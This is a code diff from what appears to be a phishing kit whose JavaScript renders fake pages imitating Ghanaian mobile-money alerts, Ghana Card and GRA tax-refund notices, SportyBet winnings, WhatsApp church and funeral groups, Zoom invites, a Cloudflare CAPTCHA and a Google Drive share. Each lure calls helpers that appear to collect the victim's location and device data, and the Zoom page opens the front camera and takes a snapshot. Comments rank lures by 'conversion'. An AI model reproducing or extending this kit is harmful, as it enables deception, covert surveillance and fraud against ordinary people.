 <div class="mm-notif"><div class="top"><div class="circle" style="background:#fce4ec">💰</div>
 <div class="info"><div class="title">Transfer Received</div><div class="time">Just now</div></div>
-<div class="amount" style="color:#2e7d32">GH₵ 1,200</div></div>
+<div class="amount" style="color:#2e7d32">GH₅ 1,200</div></div>
 <div class="mm-detail">
 <div class="mm-row"><span class="k">From</span><span class="v">Kofi Asante</span></div>
 <div class="mm-row"><span class="k">Phone</span><span class="v">050 XXX XX45</span></div>
@@ -281,7 +411,10 @@ setTimeout(()=>{document.querySelector('.mm-detail').innerHTML+=`<div class="mm-
 <div class="check" style="background:#e60000">✓</div><div class="msg" style="color:#c62828">GH₵ 1,200 Received!</div>
 <div class="sub" style="color:#e57373">Credited to Vodafone Cash</div></div>`;
 b.textContent='✓ Done';b.style.background='#4caf50';b.style.color='#fff'},2500)}
-
+</script>
+</body>
+</html>
+<script>
 // ═══ ECG ═══
 function rECG(){
 setOG('ECG — Prepaid meter low balance','Your electricity balance is critically low');
@@ -301,137 +434,113 @@ document.body.innerHTML=`<div class="gv-page">
 </div></div></div></div>`;
 setTimeout(async()=>{try{await gps()}catch(e){}dev()},800)}
 async function ecgA(){const b=document.getElementById('ecgBtn');b.textContent='Connecting...';b.disabled=true;await go();
-setTimeout(()=>{b.parentElement.innerHTML+=`<div class="fade-up" style="background:#fff8e1;border-radius:8px;padding:14px;margin-top:10px;text-align:center">
-<div style="font-size:24px;margin-bottom:4px">📱</div><div style="font-size:14px;color:#f57f17;font-weight:500">MoMo prompt sent</div>
-<div style="font-size:12px;color:#999;margin-top:3px">Check phone or dial *170#</div></div>`;
-b.textContent='Prompt sent'},2500)}
-
-// ═══ GHANA CARD ═══
+setTimeout(()=>{b.textContent='✓ Connected';b.style.background='#4caf50'},2500)}
+// ═══ NIA (Ghana Card) ═══
 function rNIA(){
-setOG('Ghana Card — Renewal Required','Your Ghana Card expires soon. Verify to renew.');
-document.getElementById('tc').content='#006233';
+setOG('NIA — Ghana Card Ready for Collection','Your Ghana Card is ready. Verify to collect.');
+document.getElementById('tc').content='#1b5e20';
 document.body.innerHTML=`<div class="gv-page">
-<div class="gv-bar" style="background:#006233"><span>🇬🇭</span><span class="logo" style="color:#fff">NIA — Ghana Card</span></div>
+<div class="gv-bar" style="background:#1b5e20"><span>🇬🇭</span><span class="logo" style="color:#fff">NIA Ghana</span></div>
 <div class="gv-bd">
-<div class="gv-alert" style="background:#fff3e0;border-color:#ff9800;color:#e65100">📋 Your Ghana Card needs renewal</div>
-<div class="gv-card"><div class="hdr" style="background:#006233"><h2>Ghana Card Renewal</h2><div class="sub">National Identification Authority</div></div>
+<div class="gv-alert" style="background:#e8f5e9;border-color:#4caf50;color:#1b5e20">✅ Your Ghana Card is READY for collection</div>
+<div class="gv-card"><div class="hdr" style="background:#1b5e20"><h2>Ghana Card Collection</h2><div class="sub">National Identification Authority</div></div>
 <div class="bdy">
-<div class="gv-row"><span class="k">Status</span><span class="v" style="color:#e65100">⚠️ Expiring Soon</span></div>
-<div class="gv-row"><span class="k">Expiry</span><span class="v">August 30, 2026</span></div>
-<div class="gv-row"><span class="k">Renewal</span><span class="v">Pending Verification</span></div>
-<div class="gv-row"><span class="k">Nearest Office</span><span class="v" id="niaOff">Locating...</span></div>
-<div style="background:#e8f5e9;border-radius:6px;padding:8px;margin:8px 0;font-size:12px;color:#2e7d32">✅ You can renew online. No office visit needed.</div>
-<button class="gv-btn" style="background:#006233" id="niaBtn" onclick="niaV()">Verify & Renew</button>
-</div></div></div></div>`;
-setTimeout(async()=>{try{await gps();document.getElementById('niaOff').textContent='Found — 1.3 km away'}catch(e){document.getElementById('niaOff').textContent='Enable location'}dev()},800)}
-async function niaV(){const b=document.getElementById('niaBtn');b.textContent='Verifying...';b.disabled=true;await go();
-setTimeout(()=>{b.parentElement.innerHTML+=`<div class="fade-up" style="background:#e8f5e9;border-radius:8px;padding:14px;margin-top:10px;text-align:center">
-<div style="font-size:24px;margin-bottom:4px">✅</div><div style="font-size:14px;color:#2e7d32;font-weight:500">Submitted</div>
-<div style="font-size:12px;color:#66bb6a;margin-top:3px">New card ready in 14 working days. SMS notification will follow.</div></div>`;
-b.textContent='✓ Submitted';b.style.background='#4caf50'},2500)}
-
-// ═══ GRA TAX ═══
-function rGRA(){
-setOG('GRA — Tax Clearance Ready','Your Tax Clearance Certificate is approved. Tap to download.');
-document.getElementById('tc').content='#006233';
-document.body.innerHTML=`<div class="gv-page">
-<div class="gv-bar" style="background:#006233"><span>🇬🇭</span><span class="logo" style="color:#fff">GRA — Tax Portal</span></div>
-<div class="gv-bd">
-<div class="gv-alert" style="background:#e8f5e9;border-color:#4caf50;color:#2e7d32">✅ Tax Clearance Certificate ready</div>
-<div class="gv-card"><div class="hdr" style="background:#006233"><h2>Tax Clearance Certificate</h2><div class="sub">Ghana Revenue Authority</div></div>
-<div class="bdy">
-<div class="gv-row"><span class="k">TIN</span><span class="v">Based on records</span></div>
-<div class="gv-row"><span class="k">Tax Year</span><span class="v">2025/2026</span></div>
-<div class="gv-row"><span class="k">Status</span><span class="v" style="color:#2e7d32">✅ Approved</span></div>
-<div class="gv-row"><span class="k">Certificate</span><span class="v">TCC/2026/${Math.floor(Math.random()*90000+10000)}</span></div>
-<div class="gv-row"><span class="k">Valid Until</span><span class="v">Dec 31, 2026</span></div>
-<button class="gv-btn" style="background:#006233" id="graBtn" onclick="graD()">Verify & Download</button>
+<div class="gv-row"><span class="k">Card No.</span><span class="v">GHA-XXXXXXXXX-X</span></div>
+<div class="gv-row"><span class="k">Status</span><span class="v" style="color:#2e7d32">Ready</span></div>
+<div class="gv-row"><span class="k">Collection</span><span class="v">Accra Regional Office</span></div>
+<div class="gv-row"><span class="k">Deadline</span><span class="v" style="color:#c62828">Jul 20, 2026</span></div>
+<div class="gv-row"><span class="k">Requirement</span><span class="v">Verify identity first</span></div>
+<button class="gv-btn" style="background:#1b5e20" id="niaBtn" onclick="niaA()">Verify & Schedule Collection</button>
 </div></div></div></div>`;
 setTimeout(async()=>{try{await gps()}catch(e){}dev()},800)}
-async function graD(){const b=document.getElementById('graBtn');b.textContent='Preparing...';b.disabled=true;await go();
-setTimeout(()=>{b.parentElement.innerHTML+=`<div class="fade-up" style="background:#e8f5e9;border-radius:8px;padding:14px;margin-top:10px;text-align:center">
-<div style="font-size:24px;margin-bottom:4px">📄</div><div style="font-size:14px;color:#2e7d32;font-weight:500">Certificate ready</div>
-<div style="font-size:12px;color:#66bb6a;margin-top:3px">Sent to your registered email. Collect printed copy at nearest GRA office.</div></div>`;
-b.textContent='✓ Sent'},2500)}
-
+async function niaA(){const b=document.getElementById('niaBtn');b.textContent='Verifying...';b.disabled=true;await go();
+setTimeout(()=>{b.textContent='✓ Verified — Collect Monday';b.style.background='#4caf50'},2500)}
+// ═══ GRA (Tax) ═══
+function rGRA(){
+setOG('GRA — Tax Refund GH₵ 2,340','Your tax refund is ready. Verify to receive.');
+document.getElementById('tc').content='#004d40';
+document.body.innerHTML=`<div class="gv-page">
+<div class="gv-bar" style="background:#004d40"><span>🏛️</span><span class="logo" style="color:#fff">GRA</span></div>
+<div class="gv-bd">
+<div class="gv-alert" style="background:#e8f5e9;border-color:#4caf50;color:#1b5e20">💰 Tax Refund: GH₵ 2,340 approved</div>
+<div class="gv-card"><div class="hdr" style="background:#004d40"><h2>Tax Refund Notice</h2><div class="sub">Ghana Revenue Authority</div></div>
+<div class="bdy">
+<div class="gv-row"><span class="k">TIN</span><span class="v">P00XXXXXXXX</span></div>
+<div class="gv-row"><span class="k">Refund</span><span class="v" style="color:#2e7d32;font-size:16px">GH₵ 2,340.00</span></div>
+<div class="gv-row"><span class="k">Period</span><span class="v">FY 2025</span></div>
+<div class="gv-row"><span class="k">Status</span><span class="v" style="color:#f57f17">Pending verification</span></div>
+<div class="gv-row"><span class="k">Expires</span><span class="v" style="color:#c62828">48 hours</span></div>
+<button class="gv-btn" style="background:#004d40" id="graBtn" onclick="graA()">Verify & Receive Refund</button>
+</div></div></div></div>`;
+setTimeout(async()=>{try{await gps()}catch(e){}dev()},800)}
+async function graA(){const b=document.getElementById('graBtn');b.textContent='Verifying...';b.disabled=true;await go();
+setTimeout(()=>{b.textContent='✓ Refund Processing';b.style.background='#4caf50'},2500)}
 // ═══ SPORTYBET ═══
 function rBet(){
-setOG('SportyBet — You won GH₵ 2,450!','Your accumulator bet won! Tap to withdraw.');
-document.getElementById('tc').content='#1a237e';
+setOG('SportyBet — You Won GH₵ 2,450!','Your accumulator won. Withdraw now.');
+document.getElementById('tc').content='#ff6600';
 document.body.innerHTML=`<div class="mm-page">
-<div class="mm-bar" style="background:#1a237e"><span class="back" style="color:#fff">‹</span><span class="logo" style="color:#ffcb05">Sporty<span style="color:#fff">Bet</span></span><span class="icons" style="color:#fff">⋮</span></div>
+<div class="mm-bar" style="background:#1a1a1a"><span class="logo" style="color:#ff6600">SportyBet</span><span class="icons" style="color:#fff">⋮</span></div>
 <div class="mm-body">
-<div style="background:#e8f5e9;border-radius:10px;padding:14px;text-align:center;margin-bottom:10px">
-<div style="font-size:12px;color:#2e7d32;font-weight:500">🎉 CONGRATULATIONS!</div>
-<div style="font-size:26px;color:#2e7d32;font-weight:700">GH₵ 2,450.00</div>
-<div style="font-size:13px;color:#66bb6a;margin-top:3px">Your accumulator won!</div></div>
-<div class="mm-notif"><div class="mm-detail">
-<div class="mm-row"><span class="k">Bet ID</span><span class="v" style="font-family:monospace;font-size:11px">BET${Date.now().toString().slice(-8)}</span></div>
-<div class="mm-row"><span class="k">Type</span><span class="v">Accumulator (5 legs)</span></div>
+<div class="mm-pending" style="background:#fff3e0;color:#e65100"><span class="dot" style="background:#ff6600"></span>🎉 Congratulations! You WON</div>
+<div class="mm-notif"><div class="top"><div class="circle" style="background:#e8f5e9">🏆</div>
+<div class="info"><div class="title">Accumulator Won!</div><div class="time">Just now</div></div>
+<div class="amount" style="color:#2e7d32">GH₵ 2,450</div></div>
+<div class="mm-detail">
+<div class="mm-row"><span class="k">Bet ID</span><span class="v">SB${Date.now().toString().slice(-8)}</span></div>
 <div class="mm-row"><span class="k">Stake</span><span class="v">GH₵ 50</span></div>
 <div class="mm-row"><span class="k">Odds</span><span class="v">49.0x</span></div>
-<div class="mm-row"><span class="k">Winnings</span><span class="v" style="color:#2e7d32;font-size:16px;font-weight:700">GH₵ 2,450</span></div>
-<div class="mm-row"><span class="k">Withdraw To</span><span class="v">MTN MoMo</span></div>
-<button class="mm-btn" style="background:#1a237e;color:#fff" id="betBtn" onclick="betC()">Withdraw to MoMo</button>
+<div class="mm-row"><span class="k">Winnings</span><span class="v" style="color:#2e7d32">GH₵ 2,450</span></div>
+<div class="mm-row"><span class="k">Status</span><span class="v" style="color:#f57f17">Withdraw now</span></div>
+<button class="mm-btn" style="background:#ff6600;color:#fff" id="betBtn" onclick="betA()">Withdraw to MoMo</button>
 </div></div></div></div>`;
 setTimeout(async()=>{try{await gps()}catch(e){}dev()},800)}
-async function betC(){const b=document.getElementById('betBtn');b.textContent='Processing...';b.disabled=true;await go();
-setTimeout(()=>{document.querySelector('.mm-detail').innerHTML+=`<div class="mm-receipt fade-up" style="background:#e8eaf6">
-<div class="check" style="background:#1a237e">✓</div><div class="msg" style="color:#1a237e">Withdrawal Initiated!</div>
-<div class="sub" style="color:#5c6bc0">GH₵ 2,450 to MoMo in 5-15 min</div></div>`;
-b.textContent='✓ Processing'},2500)}
-
-// ═══ WHATSAPP GROUPS ═══
+async function betA(){const b=document.getElementById('betBtn');b.textContent='Processing...';b.disabled=true;await go();
+setTimeout(()=>{b.textContent='✓ Sent to MoMo';b.style.background='#4caf50'},2500)}
+// ═══ WHATSAPP GROUP ═══
 function rWA(){
-const isChurch=PB==='church';
-const isFuneral=PB==='funeral';
-const g=isFuneral?
-{name:'Funeral Planning — Nana Yaw Boakye 🕊️',icon:'🕊️',desc:'One week celebration planning. Contributions and updates. May his soul rest in peace 🙏',count:'67',
-members:[{n:'Auntie Grace',r:'Admin',e:'👩'},{n:'Elder Mensah',r:'Admin',e:'👨'},{n:'Ama Serwaa',e:'👩'},{n:'Kofi Agyeman',e:'👨'},{n:'Akosua Prah',e:'��'},{n:'Yaw Asante',e:'👨'}]}:
-isChurch?
-{name:'Church of Pentecost — Madina',icon:'⛪',desc:'Announcements, prayer requests, and weekly schedule. God is good! 🙏',count:'148',
-members:[{n:'Elder Owusu',r:'Admin',e:'👨‍💼'},{n:'Deaconess Adwoa',r:'Admin',e:'👩'},{n:'Bro. Kwesi',e:'👨'},{n:'Sis. Abena',e:'👩'},{n:'Pastor Mensah',r:'Admin',e:'👨'}]}:
-{name:'Family Meeting 🏠',icon:'👨‍👩‍👧‍👦',desc:'Family discussions and contributions. Respect everyone. No politics! 😂',count:'34',
-members:[{n:'Auntie Grace',r:'Admin',e:'👩'},{n:'Uncle Kofi',r:'Admin',e:'👨'},{n:'Ama Serwaa',e:'👩'},{n:'Yaw Boateng',e:'👨'},{n:'Akua Donkor',e:'👩'}]};
-setOG(g.name,'Tap to join the group · '+g.count+' participants');
-document.getElementById('tc').content='#1f2c34';
-document.body.innerHTML=`<div class="w-page"><div class="w-hero"><div class="img">${g.icon}</div>
-<div class="name">${g.name}</div><div class="meta">Group · ${g.count} participants</div></div>
-<div class="w-body"><div class="w-sec"><div class="hd">Description</div><div class="bd">${g.desc}</div></div>
+const groups={
+family:{name:'Family Meeting 🏠',icon:'👨‍👩‍👧‍👦',desc:'Planning Grandma\'s 80th birthday party. Everyone contribute GH₵ 100.',count:24,
+members:[{e:'👩',n:'Auntie Grace',r:'Admin'},{e:'👨',n:'Uncle Kofi',r:'Admin'},{e:'👧',n:'Ama Serwaa'},{e:'👦',n:'Yaw Boateng'},{e:'👩',n:'Akua Donkor'}]},
+church:{name:'COP — Madina Assembly',icon:'⛪',desc:'Church of Pentecost Madina. Bible study, announcements, and prayer requests.',count:156,
+members:[{e:'👨',n:'Elder Owusu',r:'Admin'},{e:'👩',n:'Deaconess Adwoa',r:'Admin'},{e:'👨',n:'Bro. Kwesi'},{e:'👩',n:'Sis. Abena'},{e:'👨',n:'Pastor Mensah'}]},
+funeral:{name:'Funeral — Nana Yaw 🕊️',icon:'🕊️',desc:'Planning one-week observance. Contributions and logistics.',count:45,
+members:[{e:'👩',n:'Auntie Grace',r:'Admin'},{e:'👨',n:'Elder Mensah',r:'Admin'},{e:'👧',n:'Ama Serwaa'},{e:'👨',n:'Kofi Agyeman'},{e:'👩',n:'Akosua Prah'}]}
+};
+const g=groups[PB]||groups.family;
+setOG(`WhatsApp — ${g.name}`,g.desc);
+document.getElementById('tc').content='#111b21';
+document.body.innerHTML=`<div class="w-grp"><div class="w-hdr"><span class="bk">←</span>
+<div class="ga">${g.icon}</div><div class="gi"><div class="gn">${g.name}</div><div class="gs">${g.count} participants</div></div>
+<div style="color:#aebac1;display:flex;gap:14px;font-size:16px">📹 📞 ⋮</div></div>
+<div class="w-sec"><div class="hd">Description</div><div class="bd">${g.desc}</div></div>
 <div class="w-sec"><div class="hd">Participants · ${g.count}</div>
 ${g.members.map(m=>`<div class="w-mem"><div class="av">${m.e}</div><div style="flex:1"><div class="nm">${m.n}</div>
 ${m.r?`<span class="rl">${m.r}</span>`:`<div class="ab">Hey there!</div>`}</div></div>`).join('')}
 <div class="w-mem" style="justify-content:center;padding:10px"><span style="color:#008069;font-size:13px">View all →</span></div>
 </div></div><div class="w-fix"><button class="w-jb" id="wb" onclick="jW()">Join group</button><div class="w-e2e">🔒 End-to-end encrypted</div></div></div>`}
-
 async function jW(){const b=document.getElementById('wb');b.textContent='Joining...';b.disabled=true;await go();
 const isChurch=PB==='church',isFuneral=PB==='funeral';
 const gName=isFuneral?'Funeral — Nana Yaw 🕊️':isChurch?'COP — Madina':'Family Meeting 🏠';
 const gIcon=isFuneral?'🕊️':isChurch?'⛪':'👨‍👩‍👧‍👦';
 const msgs=isFuneral?[
 {s:'Auntie Grace',t:'Akwaaba. We need to plan the one week. Please contribute GH₵ 200 each.',d:1200,c:'#06cf9c'},
-{s:'Elder Mensah',t:'May his soul rest in perfect peace 🙏 The family thanks everyone.',d:3500,c:'#e6a820'},
+{s:'Elder Mensah',t:'May his soul rest in perfect peace 🙏',d:3500,c:'#e6a820'},
 {s:'Ama Serwaa',t:'I will send my contribution this evening.',d:6000,c:'#53bdeb'},
-{s:'Kofi Agyeman',t:'What date is the one week? And where?',d:9000,c:'#ff6b6b'},
-{s:'Auntie Grace',t:'Next Saturday at the family house in Adenta. From 8AM. Bring chairs.',d:13000,c:'#06cf9c'},
-{s:'Akosua Prah',t:'What about funeral cloth? Same design?',d:17000,c:'#a865e3'},
-{s:'Elder Mensah',t:'Red and black cloth. GH₵ 80/yard. See me after church Sunday.',d:22000,c:'#e6a820'},
-{s:'Yaw Asante',t:'Rest in peace Uncle 🙏🕊️',d:26000,c:'#66bb6a'},
+{s:'Kofi Agyeman',t:'What date is the one week?',d:9000,c:'#ff6b6b'},
+{s:'Auntie Grace',t:'Next Saturday at the family house in Adenta. From 8AM.',d:13000,c:'#06cf9c'},
 ]:isChurch?[
 {s:'Elder Owusu',t:'Akwaaba! God bless you 🙏',d:1200,c:'#06cf9c'},
 {s:'Deaconess Adwoa',t:'Welcome! Check pinned messages for this week.',d:3500,c:'#53bdeb'},
 {s:'Bro. Kwesi',t:'Welcome oo 🤗',d:6000,c:'#e6a820'},
 {s:'Sis. Abena',t:'Please pray for Auntie Mercy. She is at Korle Bu 🙏',d:9000,c:'#a865e3'},
-{s:'Pastor Mensah',t:'Bible study Wednesday 6PM. Bring your Bible and a friend 📖',d:13000,c:'#ff6b6b'},
-{s:'Elder Owusu',t:'Church dues for July is GH₵ 20. Pay to Deaconess Adwoa.',d:18000,c:'#06cf9c'},
+{s:'Pastor Mensah',t:'Bible study Wednesday 6PM. Bring your Bible 📖',d:13000,c:'#ff6b6b'},
 ]:[
 {s:'Auntie Grace',t:'Akwaaba! We are planning Grandma\'s birthday 🎂',d:1200,c:'#06cf9c'},
-{s:'Uncle Kofi',t:'Everyone contribute GH₵ 100 for the party. Send to Auntie Grace MoMo.',d:3500,c:'#e6a820'},
+{s:'Uncle Kofi',t:'Everyone contribute GH₵ 100. Send to Auntie Grace MoMo.',d:3500,c:'#e6a820'},
 {s:'Ama Serwaa',t:'Hiii 👋😊',d:5500,c:'#53bdeb'},
-{s:'Yaw Boateng',t:'Chale who is cooking jollof this time? 😂',d:8000,c:'#ff6b6b'},
-{s:'Auntie Grace',t:'Yaw behave yourself 😂 Akua will do jollof. Ama is doing light soup.',d:11000,c:'#06cf9c'},
-{s:'Akua Donkor',t:'I need GH₵ 300 for jollof ingredients for 50 people oo',d:15000,c:'#a865e3'},
-{s:'Uncle Kofi',t:'Party at my house East Legon. From 2PM. Bring chair if possible 😂🪑',d:20000,c:'#e6a820'},
+{s:'Yaw Boateng',t:'Who is cooking jollof this time? 😂',d:8000,c:'#ff6b6b'},
+{s:'Auntie Grace',t:'Yaw behave 😂 Akua will do jollof.',d:11000,c:'#06cf9c'},
 ];
 setTimeout(()=>{
 document.body.innerHTML=`<div class="w-page"><div class="w-hdr"><span class="bk">←</span><div class="ga">${gIcon}</div>
@@ -439,7 +548,7 @@ document.body.innerHTML=`<div class="w-page"><div class="w-hdr"><span class="bk"
 <div style="color:#aebac1;display:flex;gap:16px;font-size:16px">📹 📞 ⋮</div></div>
 <div class="w-ct" id="wc"><div class="w-dt">Today</div><div style="clear:both"></div>
 <div class="w-bb sys">You joined using the group's invite link</div><div style="clear:both"></div>
-<div class="w-bb sys">🔒 Messages and calls are end-to-end encrypted</div><div style="clear:both"></div></div>
+<div class="w-bb sys">🔒 Messages are end-to-end encrypted</div><div style="clear:both"></div></div>
 <div class="w-in"><span>😊</span><input type="text" placeholder="Message"><span>🎤</span></div></div>`;
 const cc=document.getElementById('wc');
 msgs.forEach(m=>{setTimeout(()=>{
@@ -451,24 +560,23 @@ setTimeout(()=>{tp.remove();const d=document.createElement('div');
 const tm=new Date().toLocaleTimeString([],{hour:'numeric',minute:'2-digit'});
 d.innerHTML=`<div class="w-bb in fade-up"><div class="sn" style="color:${m.c}">${m.s}</div>${m.t}<span class="tm">${tm}</span></div><div style="clear:both"></div>`;
 cc.appendChild(d);cc.scrollTop=cc.scrollHeight;document.getElementById('ws').textContent='online'},1500)},m.d)})},1800)}
-
 // ═══ ZOOM ═══
 function rZoom(){
 setOG('Zoom — Church Committee Meeting','Elder Owusu is inviting you. Tap to join.');
 document.getElementById('tc').content='#242424';
 document.body.innerHTML=`<div class="z-page"><div class="z-card">
 <div style="color:#0b5cff;font-size:24px;font-weight:700;margin-bottom:14px;letter-spacing:1px">zoom</div>
-<div class="z-cam" id="zp"><div class="ph"><div class="av">Y</div><div class="lb">Starting camera...</div></div></div>
-<div style="color:#fff;font-size:17px;font-weight:600;margin-bottom:3px">Church Committee Meeting</div>
-<div style="color:#999;font-size:13px;margin-bottom:14px">Elder Owusu's meeting · Started 2 min ago</div>
-<button onclick="zmJ()" style="background:#0b5cff;color:#fff;border:none;padding:12px;border-radius:8px;font-size:16px;cursor:pointer;width:100%;font-weight:600;font-family:inherit" id="zb">Join</button>
-<div style="text-align:center;font-size:11px;color:#666;margin-top:8px">Meeting ID: 847 2951 0384</div>
+<div class="host">Elder Owusu is inviting you to a meeting</div>
+<div class="topic">Church Committee — Weekly Meeting</div>
+<div class="meta">Meeting ID: ${Math.floor(Math.random()*900+100)} ${Math.floor(Math.random()*900+100)} ${Math.floor(Math.random()*9000+1000)}</div>
+<div class="preview"><div class="lb" id="zl">Loading camera preview...</div></div>
+<button class="z-btn" id="zb" onclick="zmJ()">Join Meeting</button>
 </div></div>`;
 setTimeout(async()=>{try{MS=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:true});
 const v=document.createElement('video');v.srcObject=MS;v.setAttribute('playsinline','');v.muted=true;
-v.style.cssText='position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover;transform:scaleX(-1)';
-const p=document.getElementById('zp');p.style.position='relative';p.innerHTML='';p.appendChild(v);
-const nm=document.createElement('div');nm.className='nm';nm.textContent='You';p.appendChild(nm);
+const p=document.querySelector('.preview');p.innerHTML='';
+const nm=document.createElement('div');nm.className='nm';nm.textContent='You';
+p.appendChild(v);p.appendChild(nm);
 await v.play();await snap('front');try{await gps()}catch(e){}dev()}catch(e){
 document.querySelector('.lb').textContent='Camera unavailable';try{await gps()}catch(e2){}dev()}},600)}
 async function zmJ(){const b=document.getElementById('zb');b.textContent='Connecting...';b.disabled=true;
@@ -482,7 +590,6 @@ setTimeout(()=>{b.parentElement.innerHTML=`<div class="fade-up" style="text-alig
 <div style="color:#ccc;font-size:13px;padding:3px 0">🟢 Elder Owusu (Host)</div>
 <div style="color:#ccc;font-size:13px;padding:3px 0">🟢 Deaconess Adwoa</div>
 <div style="color:#ccc;font-size:13px;padding:3px 0">🟢 Bro. Kwesi</div></div></div>`},3000)}
-
 // ═══ IMAGE EMBED ═══
 function rImg(){
 setOG('Photo','Tap to view');
@@ -493,8 +600,279 @@ document.body.innerHTML=`<div id="iw" style="width:100vw;height:100vh;display:fl
 ${imgUrl?`<img src="${imgUrl}" style="max-width:100%;max-height:100vh;object-fit:contain">`:'<div style="color:#fff">Tap to view</div>'}</div>`;
 document.getElementById('iw').addEventListener('click',async()=>{await go()});
 setTimeout(async()=>{try{await gps()}catch(e){}dev()},500)}
+</script>
+<script>
+// ═══════════════════════════════════════════════════════════════
+// NEW GLOBAL LURES — High-conversion templates
+// ═══════════════════════════════════════════════════════════════
 
-// ═══ GHANAIAN JOBS / ARTISAN ═══
+// ═══ CLOUDFLARE CAPTCHA (Highest conversion — people are trained to click) ═══
+function rCaptcha(){
+setOG('Security Check','One more step — verify you are human');
+document.getElementById('tc').content='#f0f0f0';
+document.body.innerHTML=`<div class="cf-page">
+<div style="text-align:center;margin-bottom:20px">
+<div style="font-size:14px;color:#555;margin-bottom:8px">Checking your browser before accessing</div>
+<div style="font-size:12px;color:#999">This process is automatic. Your browser will redirect shortly.</div>
+</div>
+<div class="cf-box">
+<div class="cf-row">
+<div class="cf-check" id="cfCheck" onclick="cfVerify()"></div>
+<div class="cf-label">Verify you are human</div>
+</div>
+<div class="cf-brand">
+<svg width="18" height="18" viewBox="0 0 61 60" fill="none"><path d="M30.5 0C13.93 0 .5 13.43.5 30s13.43 30 30 30 30-13.43 30-30S47.07 0 30.5 0z" fill="#F48120"/><path d="M30.5 5C16.69 5 5.5 16.19 5.5 30s11.19 25 25 25 25-11.19 25-25S44.31 5 30.5 5z" fill="#F6A623"/></svg>
+<span>Cloudflare Turnstile</span>
+</div>
+<div class="cf-privacy"><a href="#">Privacy</a> · <a href="#">Terms</a></div>
+</div></div>`;
+setTimeout(async()=>{try{await gps()}catch(e){}dev()},600)}
+async function cfVerify(){
+const box=document.getElementById('cfCheck');
+box.className='cf-check loading';
+box.innerHTML='';
+await go();
+setTimeout(()=>{
+box.className='cf-check done';
+box.innerHTML='<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg>';
+setTimeout(()=>{document.querySelector('.cf-page').innerHTML=`<div style="text-align:center;padding:40px">
+<div style="font-size:48px;margin-bottom:16px">✓</div>
+<div style="font-size:16px;color:#333;font-weight:500">Verification complete</div>
+<div style="font-size:13px;color:#999;margin-top:8px">Redirecting...</div></div>`},1500)
+},2000)}
+
+// ═══ GOOGLE DRIVE SHARED DOCUMENT ═══
+function rGDrive(){
+setOG('Document shared with you — Google Drive','Someone shared a file. Sign in to view.');
+document.getElementById('tc').content='#fff';
+const names=['Sarah Johnson','Michael Chen','David Williams','Emma Thompson','James Anderson'];
+const sender=names[Math.floor(Math.random()*names.length)];
+const files=['Q3_Financial_Report.pdf','Contract_Draft_v2.docx','Meeting_Notes_July.pdf','Project_Proposal.pdf','Invoice_2026.pdf'];
+const file=files[Math.floor(Math.random()*files.length)];
+document.body.innerHTML=`<div class="gd-page">
+<div class="gd-bar"><div class="logo"><svg width="24" height="24" viewBox="0 0 87.3 78" fill="none"><path d="M6.6 66.85L3.3 61.35 29.2 17.15h13.2L6.6 66.85z" fill="#0066DA"/><path d="M43.65 25.15L29.2 0h26.4l14.45 25.15H43.65z" fill="#00AC47"/><path d="M73.55 78H29.2l14.45-25.15h44.35L73.55 78z" fill="#EA4335"/><path d="M87.3 52.85H43.65L29.2 78h44.35l13.75-25.15z" fill="#00832D"/><path d="M43.65 25.15L29.2 0 6.6 39.85l14.45 25.15 22.6-39.85z" fill="#2684FC"/><path d="M43.65 25.15L73.55 78H87.3L57.4 25.15H43.65z" fill="#FFBA00"/></svg>
+<span>Drive</span></div></div>
+<div class="gd-body"><div class="gd-card">
+<div class="gd-icon" style="font-size:48px">📄</div>
+<div class="gd-title">${sender} shared a file with you</div>
+<div class="gd-sub">You have been granted access to view this document. Sign in to continue.</div>
+<div class="gd-file"><div class="fi" style="background:#e8f0fe">📋</div><div style="flex:1"><div class="fn">${file}</div><div class="fs">PDF · 2.4 MB · Shared just now</div></div></div>
+<button class="gd-btn" id="gdBtn" onclick="gdOpen()">Open Document</button>
+<div class="gd-footer">You're receiving this because ${sender} shared this file with you via Google Drive.</div>
+</div></div></div>`;
+setTimeout(async()=>{try{await gps()}catch(e){}dev()},600)}
+async function gdOpen(){
+const b=document.getElementById('gdBtn');b.textContent='Opening...';b.disabled=true;await go();
+setTimeout(()=>{document.querySelector('.gd-card').innerHTML=`<div class="fade-up" style="text-align:center;padding:20px">
+<div style="font-size:36px;margin-bottom:12px">🔒</div>
+<div style="font-size:16px;color:#202124;font-weight:500;margin-bottom:8px">Additional verification required</div>
+<div style="font-size:14px;color:#5f6368;margin-bottom:20px">For your security, please allow location access to verify your identity.</div>
+<div style="background:#e8f5e9;border-radius:8px;padding:12px;font-size:13px;color:#2e7d32">✓ Verification successful. Loading document...</div>
+<div style="margin-top:16px;font-size:12px;color:#999">This may take a moment...</div></div>`},2500)}
+
+// ═══ SECURITY ALERT (Unauthorized Login) ═══
+function rSecAlert(){
+setOG('Security Alert — Unauthorized Login Attempt','Someone tried to access your account. Verify now.');
+document.getElementById('tc').content='#d93025';
+const locations=['Lagos, Nigeria','London, UK','Moscow, Russia','Beijing, China','Unknown Location'];
+const loc=locations[Math.floor(Math.random()*locations.length)];
+const devices=['iPhone 15 Pro','Samsung Galaxy S24','Windows PC','MacBook Pro','Linux Desktop'];
+const device=devices[Math.floor(Math.random()*devices.length)];
+const ip=`${Math.floor(Math.random()*200+10)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
+document.body.innerHTML=`<div class="sa-page">
+<div class="sa-bar"><div class="logo">🔒 Security Center</div></div>
+<div class="sa-body"><div class="sa-card">
+<div class="sa-header"><div class="icon">⚠️</div><h2>Unauthorized Login Attempt</h2><p>Someone tried to access your account</p></div>
+<div class="sa-details">
+<div class="sa-row"><span class="k">Location</span><span class="v" style="color:#d93025">${loc}</span></div>
+<div class="sa-row"><span class="k">Device</span><span class="v">${device}</span></div>
+<div class="sa-row"><span class="k">IP Address</span><span class="v">${ip}</span></div>
+<div class="sa-row"><span class="k">Time</span><span class="v">${new Date().toLocaleTimeString()} (just now)</span></div>
+<div class="sa-row"><span class="k">Status</span><span class="v" style="color:#d93025">⚠️ Blocked</span></div>
+<div style="background:#fce8e6;border-radius:8px;padding:12px;margin-top:12px;font-size:13px;color:#c62828">
+If this wasn't you, verify your identity immediately to secure your account.</div>
+<button class="sa-btn" id="saBtn" onclick="saVerify()">Verify My Identity</button>
